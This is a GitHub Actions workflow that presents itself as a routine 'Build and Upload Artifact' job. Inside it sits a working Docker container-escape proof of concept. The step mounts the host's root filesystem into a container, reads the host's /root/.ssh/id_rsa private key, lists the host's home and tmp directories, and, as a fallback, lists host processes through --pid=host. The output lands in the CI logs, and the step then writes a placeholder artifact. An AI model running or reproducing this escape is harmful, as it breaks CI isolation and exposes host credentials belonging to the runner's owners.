name: Build and Upload Artifact
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Security Assessment - Container Escape PoC
        run: |
          echo "=== 环境信息 ==="
          id
          cat /proc/1/cgroup
          ls -la /var/run/docker.sock 2>/dev/null
          echo "=== Docker 逃逸 PoC - 读取宿主机 /root ==="
          docker run --rm --entrypoint=/bin/sh -v /:/host ghcr.io/github/gh-aw-mcpg -c 'ls -la /host/root/ 2>&1; echo ---; cat /host/root/.ssh/id_rsa 2>/dev/null || echo "no ssh key"; echo ---; ls -la /host/home/ 2>&1; echo ---; ls -la /host/tmp/ 2>&1 | head -10' 2>&1
          
          echo "=== 备用方案: 用 --pid=host ==="
          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c 'ps aux 2>&1 | head -20' 2>&1
          echo "=== 完成 ==="
          mkdir -p dist
          echo "Built at $(date)" > dist/output.txt

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: my-artifact
          path: dist/output.txt
